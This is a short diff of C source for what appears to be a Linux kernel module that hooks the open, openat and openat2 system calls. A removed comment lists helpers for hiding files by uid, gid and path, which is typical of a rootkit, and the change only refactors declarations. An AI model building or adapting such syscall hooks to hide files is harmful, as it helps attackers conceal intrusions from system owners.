@@ -1,17 +1,4 @@
-/*
-    Находятся в resources/hide_files_functions.c
-
-    bool copy_filepath(char *filepath, char **kfilepath);
-    bool is_hide_uid(unsigned int file_uid);
-    bool is_hide_gid(unsigned int file_gid);
-    bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath);
-
-    unsigned int uids[];
-    unsigned int gids[];
-    struct Extended_array ea_uids;
-    struct Extended_array ea_gids;
-*/
-// ===================== Перехват функций ===============================
+#include "files.h"
 
 /*
     asmlinkage long sys_open(
@@ -20,7 +7,7 @@
         umode_t mode                    - dx
         );
 */
-static asmlinkage long ex_sys_open(struct pt_regs *regs)
+asmlinkage long ex_sys_open(struct pt_regs *regs)
 {
     long ret = real_sys_open(regs);
 
@@ -53,7 +40,7 @@ out:
         umode_t mode                    - r10
         );
 */
-static asmlinkage long ex_sys_openat(struct pt_regs *regs)
+asmlinkage long ex_sys_openat(struct pt_regs *regs)
 {
     long ret = real_sys_openat(regs);
 
@@ -87,7 +74,7 @@ out:
         );
 
 */
-static asmlinkage long ex_sys_openat2(struct pt_regs *regs)
+asmlinkage long ex_sys_openat2(struct pt_regs *regs)
 {
     long ret = real_sys_openat2(regs);
 
